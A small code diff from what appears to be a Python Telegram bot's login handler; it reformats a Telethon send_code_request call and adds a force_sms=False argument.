@@ -196,8 +196,11 @@ async def login_flow(msg: types.Message):
         phone = "+" + digits
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        sent = await client.send_code_request(phone)
-
+        sent = await client.send_code_request(
+        phone,
+        force_sms=False
+        )
+        
         state.update({
             "step": "code",
             "phone": phone,
